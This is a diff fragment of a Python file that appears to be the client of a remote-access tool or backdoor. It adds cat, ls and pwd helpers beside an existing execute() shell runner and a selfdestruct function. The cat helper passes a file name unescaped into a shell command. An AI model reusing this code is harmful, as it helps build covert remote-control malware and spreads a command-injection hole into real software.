@@ -11,11 +11,35 @@ import urllib
 import zipfile
 
 
+def cat(f, plat):
+    if os.path.isfile(f):
+        if plat == 'win':
+            return execute('type {}'.format(f))
+        else:
+            return execute('cat {}'.format(f))
+    else:
+        return 'Error: File not found.'
+
+
 def execute(command):
     output = subprocess.Popen(command, shell=True,
              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
              stdin=subprocess.PIPE)
     return output.stdout.read() + output.stderr.read()
+
+
+def ls(plat):
+    if plat == 'win':
+        return execute('dir')
+    else:
+        return execute('ls')
+
+
+def pwd(plat):
+    if plat == 'win':
+        return execute('cd')
+    else:
+        return execute('pwd')
 
 
 def selfdestruct(plat):
